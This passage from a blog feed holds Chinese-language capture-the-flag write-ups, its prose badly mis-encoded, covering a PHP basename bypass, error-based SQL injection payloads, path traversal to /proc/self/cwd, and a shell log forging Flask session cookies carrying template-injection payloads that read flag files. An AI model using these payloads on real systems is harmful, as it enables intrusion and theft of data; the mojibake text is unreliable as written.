<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ğŸ•è¯´ï¼šwndmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬ä½¿ç”¨è¿™ç§æ–¹å¼æ¥åˆ›å»ºä¹‹åï¼Œå°±æ²¡æœ‰åœ°æ–¹æ¥ä½¿ç”¨@Componentè¿™ä¸ªæ³¨è§£äº†ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰XMLå‘¢ï¼Ÿ</p>
<p>æ€»è€Œè¨€ä¹‹æˆ‘å¿…é¡»ä¸åšå‡ºè¿™æ ·çš„JavaConfigä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@Component(&quot;com.ys.pojo&quot;)</span></span><br><span class="line"><span class="meta">@Import(JavaConfig2.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaConfig</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cat <span class="title">cat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Cat();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dog <span class="title">dog</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Dog();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è€Œæˆ‘ä»¬çš„@Componentå°±æ²¡æœ‰ä»€ä¹ˆç”¨æ­¦ä¹‹åœ°äº†..</p>
]]></content>
      <tags>
        <tag>å¼€å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>RoacCTFOnlineProxy</title>
    <url>/2020/11/26/RoacCTFOnlineProxy/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>Zer0pts2020</title>
    <url>/2020/11/24/Zer0pts2020/</url>
    <content><![CDATA[<h1 id="Can-you-guess-it"><a href="#Can-you-guess-it" class="headerlink" title="Can you guess it?"></a>Can you guess it?</h1><p>ä¸€å¼€å§‹æ”¾æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  $guess = (<span class="keyword">string</span>) $_POST[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $message = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;<span class="keyword">If</span> your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>è™½ç„¶è¿™é‡Œçš„çŒœæµ‹æˆåŠŸä¹‹åä½ å¯ä»¥æ‹¿åˆ°flagï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾è¿™é‡Œçš„å‡½æ•°å¹¶æ²¡æœ‰æ¼æ´ï¼Œç”¨çš„å‡½æ•°æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œé‚£ä¹ˆå°±è½¬æ¢æ€è·¯çœ‹ä¸Šé¢çš„ highlight_fileï¼Œå› ä¸ºè¿™é‡Œçš„å‚æ•°æˆ‘ä»¬ä¹Ÿå¯ä»¥æ§åˆ¶ï¼Œä»‹ç»ä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>è¯¥å‚æ•°ä¼šè¿”å›æˆ‘ä»¬çš„URLçš„è·¯å¾„ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="image-20201124124501905.png" alt="image-20201124124501905"></p>
<p>æˆ‘ä»¬å†ç”¨basenameå¥—ä¸Šå»</p>
<p><img src="image-20201124124659976.png" alt="image-20201124124659976"></p>
<p>è¿™æ ·å°±å¯ä»¥æ‹¿åˆ°æœ€åä¸€éƒ¨åˆ†äº†ï¼Œä½†æ˜¯basenameæœ‰ä¸€ä¸ªé—®é¢˜ï¼š</p>
<p><img src="image-20201124124821264.png" alt="image-20201124124821264"></p>
<p>å®˜ç½‘æ˜¯æœ‰æç¤ºçš„ï¼Œæˆ‘ä»¬éœ€è¦å•ç‹¬çš„setloaleæ¥è¿›è¡Œæ“ä½œï¼Œå› ä¸ºasciiä¸­æœ‰è¿™ä¹ˆä¸€æ®µä»‹ç»ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">åœ¨è‹±è¯­ä¸­ï¼Œç”¨128ä¸ªç¬¦å·ç¼–ç ä¾¿å¯ä»¥è¡¨ç¤ºæ‰€æœ‰ï¼Œä½†æ˜¯ç”¨æ¥è¡¨ç¤ºå…¶ä»–è¯­è¨€ï¼Œ128ä¸ªç¬¦å·æ˜¯ä¸å¤Ÿçš„ã€‚æ¯”å¦‚ï¼Œåœ¨æ³•è¯­ä¸­ï¼Œå­—æ¯ä¸Šæ–¹æœ‰æ³¨éŸ³ç¬¦å·ï¼Œå®ƒå°±æ— æ³•ç”¨ ASCII ç è¡¨ç¤ºã€‚äºæ˜¯ï¼Œä¸€äº›æ¬§æ´²å›½å®¶å°±å†³å®šï¼Œåˆ©ç”¨å­—èŠ‚ä¸­é—²ç½®çš„æœ€é«˜ä½ç¼–å…¥æ–°çš„ç¬¦å·ã€‚æ¯”å¦‚ï¼Œæ³•è¯­ä¸­çš„Ã©çš„ç¼–ç ä¸º130ï¼ˆäºŒè¿›åˆ¶10000010ï¼‰ã€‚è¿™æ ·ä¸€æ¥ï¼Œè¿™äº›æ¬§æ´²å›½å®¶ä½¿ç”¨çš„ç¼–ç ä½“ç³»ï¼Œå¯ä»¥è¡¨ç¤ºæœ€å¤š256ä¸ªç¬¦å· [5]  ã€‚</span><br><span class="line">ä½†æ˜¯ï¼Œè¿™é‡Œåˆå‡ºç°äº†æ–°çš„é—®é¢˜ã€‚ä¸åŒçš„å›½å®¶æœ‰ä¸åŒçš„å­—æ¯ï¼Œå› æ­¤ï¼Œå“ªæ€•å®ƒä»¬éƒ½ä½¿ç”¨256ä¸ªç¬¦å·çš„ç¼–ç æ–¹å¼ï¼Œä»£è¡¨çš„å­—æ¯å´ä¸ä¸€æ ·ã€‚æ¯”å¦‚ï¼Œ130åœ¨æ³•è¯­ç¼–ç ä¸­ä»£è¡¨äº†Ã©ï¼Œåœ¨å¸Œä¼¯æ¥è¯­ç¼–ç ä¸­å´ä»£è¡¨äº†å­—æ¯Gimel (×’)ï¼Œåœ¨ä¿„è¯­ç¼–ç ä¸­åˆä¼šä»£è¡¨å¦ä¸€ä¸ªç¬¦å·ã€‚ä½†æ˜¯ä¸ç®¡æ€æ ·ï¼Œæ‰€æœ‰è¿™äº›ç¼–ç æ–¹å¼ä¸­ï¼Œ0--127è¡¨ç¤ºçš„ç¬¦å·æ˜¯ä¸€æ ·çš„ï¼Œä¸ä¸€æ ·çš„åªæ˜¯128--255çš„è¿™ä¸€æ®µ [5]  ã€‚</span><br><span class="line">è‡³äºäºšæ´²å›½å®¶çš„æ–‡å­—ï¼Œä½¿ç”¨çš„ç¬¦å·å°±æ›´å¤šäº†ï¼Œæ±‰å­—å°±å¤šè¾¾10ä¸‡å·¦å³ã€‚ä¸€ä¸ªå­—èŠ‚åªèƒ½è¡¨ç¤º256ç§ç¬¦å·ï¼Œè‚¯å®šæ˜¯ä¸å¤Ÿçš„ï¼Œå°±å¿…é¡»ä½¿ç”¨å¤šä¸ªå­—èŠ‚è¡¨è¾¾ä¸€ä¸ªç¬¦å·ã€‚æ¯”å¦‚ï¼Œç®€ä½“ä¸­æ–‡å¸¸è§çš„ç¼–ç æ–¹å¼æ˜¯ GB2312ï¼Œä½¿ç”¨ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªæ±‰å­—ï¼Œæ‰€ä»¥ç†è®ºä¸Šæœ€å¤šå¯ä»¥è¡¨ç¤º 256 x 256 = 65536 ä¸ªç¬¦å· [5]  ã€‚</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦æˆ‘ä»¬çš„asciiä½æ•°å¤§äº128ï¼Œå°±ä¼šå‡ºç°æ­§ä¹‰çš„æƒ…å†µï¼Œè€Œæ±‰å­—é»˜è®¤ä½¿ç”¨çš„æ˜¯GBKç¼–ç ï¼Œå¦‚æœæˆ‘ä»¬è¾“å‡ºçš„æ•°å¤§äº128ï¼Œbasenameå› ä¸ºæ— æ³•æ­£ç¡®çš„è§£æï¼Œå°±ä¼šå¿½ç•¥è¿™ ä¸€æ®µï¼Œå‘å‰æŸ¥æ‰¾ã€‚</p>
<p><img src="image-20201124125211434.png" alt="image-20201124125211434"></p>
<p>é‚£æˆ‘ä»¬çš„æ€è·¯å°±å¾ˆæ¸…æ¥šäº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;3a053ba1-1ae6-4030-8c67-3cacb6336ad7.node3.buuoj.cn&#x2F;index.php&#x2F;config.php&#x2F;%81?source</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<p><img src="image-20201124125355533.png" alt="image-20201124125355533"></p>
<h1 id="phpNantokaAdmin"><a href="#phpNantokaAdmin" class="headerlink" title="phpNantokaAdmin"></a>phpNantokaAdmin</h1><h1 id="MusicBlog"><a href="#MusicBlog" class="headerlink" title="MusicBlog"></a>MusicBlog</h1><p>è¿™é‡Œä¸»è¦æ˜¯ç”¨åˆ°äº†ä¸€ä¸ªtrickï¼Œå…³äºHTMLçš„ä¸€ä¸ªç»†èŠ‚ã€‚å½“HTMLå‡ºç°&lt;a/xxx&gt;çš„æƒ…å†µä¸‹ï¼Œåˆ™ä¼šé»˜è®¤åªè§£æå‰åŠéƒ¨åˆ†ï¼Œè€Œä¸ä¼šè§£æåé¢çš„partï¼Œå…·ä½“ä¾‹å­å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">title</span>&gt;</span>åŸºç¡€æŸ±çŠ¶å›¾<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> &gt;</span> 123123123123<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">a</span>/<span class="attr">bcde</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½†åœ¨è§£æç§ï¼Œä¾ç„¶ä¼šå°†åè€…è§£æå˜æˆaæ ‡ç­¾ã€‚</p>
<p>å›åˆ°é¢˜ç›®æ¥è¯´ï¼Œåªéœ€è¦æˆ‘ä»¬é€šè¿‡è¯¥ç‰¹è´¨+hrefå³å¯å®Œæˆè·¨åŸŸç»•è¿‡</p>
<p>è¯¦ç»†æ–‡ç« ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;guokeya.github.io&#x2F;post&#x2F;rFsNvBC3x&#x2F;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;bugs.php.net&#x2F;bug.php?id&#x3D;78814</span><br></pre></td></tr></table></figure>



<p><img src="Zer0pts2020/image-20201202150825012.png" alt="image-20201202150825012"></p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>N1BOOK</title>
    <url>/2020/12/03/N1BOOK/</url>
    <content><![CDATA[<h1 id="1-4æ²¡å•¥å¥½è¯´çš„"><a href="#1-4æ²¡å•¥å¥½è¯´çš„" class="headerlink" title="1-4æ²¡å•¥å¥½è¯´çš„"></a>1-4æ²¡å•¥å¥½è¯´çš„</h1><h1 id="arf-2"><a href="#arf-2" class="headerlink" title="arf_2"></a>arf_2</h1><p>åˆ©ç”¨nginxçš„è§£æé”™è¯¯</p>
<h1 id="SQLæ³¨å…¥2"><a href="#SQLæ³¨å…¥2" class="headerlink" title="SQLæ³¨å…¥2"></a>SQLæ³¨å…¥2</h1><p>ä¸€ä¸ªæŠ¥é”™æ³¨å…¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin&#x27; and  extractvalue(0x0a,concat(0x0a,(<span class="keyword">sELect</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()  ))) <span class="comment"># </span></span><br></pre></td></tr></table></figure>



<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin&#x27; and  extractvalue(0x0a,concat(0x0a,(<span class="keyword">sELect</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;fl4g&#x27;</span>  ))) <span class="comment"># </span></span><br></pre></td></tr></table></figure>



<h1 id="afr-3"><a href="#afr-3" class="headerlink" title="afr_3"></a>afr_3</h1><p>ä¸ä¼šäº†ï¼Œå­¦ä¹ äº†ã€‚</p>
<p>å½“æˆ‘ä»¬è¯»å–æ–‡ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡è¯»å–proc/self/cmdlineç›®å½•æ¥æŸ¥çœ‹ç³»ç»Ÿæ‰§è¡Œäº†ä»€ä¹ˆå‘½ä»¤</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/proc/cmdline </span><br><span class="line">åœ¨å¯åŠ¨æ—¶ä¼ é€’è‡³å†…æ ¸çš„ç›¸å…³å‚æ•°ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯é€šå¸¸ç”±liloæˆ–grubç­‰å¯åŠ¨ç®¡ç†å·¥å…·è¿›è¡Œä¼ é€’ï¼› </span><br><span class="line"></span><br><span class="line">[root@rhel5 ~]# more /proc/cmdline </span><br><span class="line">ro root=/dev/VolGroup00/LogVol00 rhgb quiet </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="image-20201203143634984.png" alt="image-20201203143634984"></p>
<p>åœ¨è¿™é‡Œå°±èƒ½çœ‹è§server.pyäº†ï¼Œäºæ˜¯å†å»proc/self/cwdç›®å½•ä¸‹è¯»å–è¿™ä¸ªæ–‡ä»¶</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">cwd â€” æŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼› </span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´cwdä¸‹å¯ä»¥è¿æ¥åˆ°æ‰€æœ‰å½“å‰æ­£åœ¨å¯åŠ¨çš„è¿›ç¨‹çš„å·¥ä½œç›®å½•</p>
<p>äºæ˜¯æ„é€ ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;3a7463f9-513b-4f61-a0d1-b5ce36abfa59.node3.buuoj.cn&#x2F;article?name&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;server.py</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> ( Flask, render_template, request, url_for, redirect, session, render_template_string )</span><br><span class="line"><span class="keyword">from</span> flask_session <span class="keyword">import</span> Session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">execfile(<span class="string">&#x27;flag.py&#x27;</span>)</span><br><span class="line">execfile(<span class="string">&#x27;key.py&#x27;</span>)</span><br><span class="line"></span><br><span class="line">FLAG = flag</span><br><span class="line">app.secret_key = key</span><br><span class="line"><span class="meta">@app.route(&quot;/n1page&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n1page</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line">    n1code = request.form.get(<span class="string">&quot;n1code&quot;</span>) <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> n1code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        n1code = n1code.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;n1code&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        session[<span class="string">&#x27;n1code&#x27;</span>] = n1code</span><br><span class="line">    template = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        template = <span class="string">&#x27;&#x27;&#x27;&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; &lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27;</span> % session[<span class="string">&#x27;n1code&#x27;</span>]</span><br><span class="line">        session[<span class="string">&#x27;n1code&#x27;</span>] = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;main.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(&#x27;/article&#x27;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">article</span>():</span></span><br><span class="line">    error = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        page = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">&#x27;article&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> page.find(<span class="string">&#x27;flag&#x27;</span>)&gt;=<span class="number">0</span>:</span><br><span class="line">        page = <span class="string">&#x27;notallowed.txt&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        template = <span class="built_in">open</span>(<span class="string">&#x27;/home/nu11111111l/articles/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(page)).read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        template = e</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, template=template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>çœ‹è§flagè¢«è¿‡æ»¤äº†ï¼Œè¯»ä¸€ä¸‹key.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Drmhze6EPcv0fN_81Bj-nA</span><br></pre></td></tr></table></figure>

<p>çŒ›æµ‹äº†ä¸€æ³¢</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.eJyrVsozTM5PSVWyUqquVoiO1YuPT85JLC6Ojweycovy4-OjdQ1BosWlSWCJVKCUhma0qSVIMDMvswSsMj0nPykxB6IrqTQzpyQzD8hRUKitVaoFALt_IyQ.X8irqA.tYkx2Q2zmFaN_M5JnsennKV32nI</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40] &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1syXS5fX3N1YmNsYXNzZXNfXygpWzQwXSB9fSJ9.X8isNQ.mwsFCJ2g4ZXyuONHb9SWzKEHrVk</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1syXS5fX3N1YmNsYXNzZXNfXygpIH19In0.X8isRA._rfFegMxGGcZG8hbm0Et10WBnFI</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1stMV0uX19zdWJjbGFzc2VzX18oKSB9fSJ9.X8isYg.HxdhLvdW6lQkPiK3HHLXq7safdU</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;\&#x27;\&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">bash: æœªé¢„æœŸçš„ç¬¦å·â€œ(â€é™„è¿‘æœ‰è¯­æ³•é”™è¯¯</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKCkgfX0ifQ.X8isow.oTg9cFIhfKJan3dvrWECrR8Y4xs</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40] &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdIH19In0.X8iswQ.4rU8qOrp7diJa_N5IjdCwm0EvLQ</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;) &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdKCdmbGFnLnB5JykgfX0ifQ.X8is5w.TImXqmpXkV0tjZzmcVFAIvvFP28</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;).read() &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdKCdmbGFnLnB5JykucmVhZCgpIH19In0.X8is9Q._7aNNdKqdaXGJ6mbSLLA1W9wjBQ</span><br><span class="line">root@kali:/flask-session-cookie-manager# </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æœ€åæ‰æˆåŠŸï¼š</p>
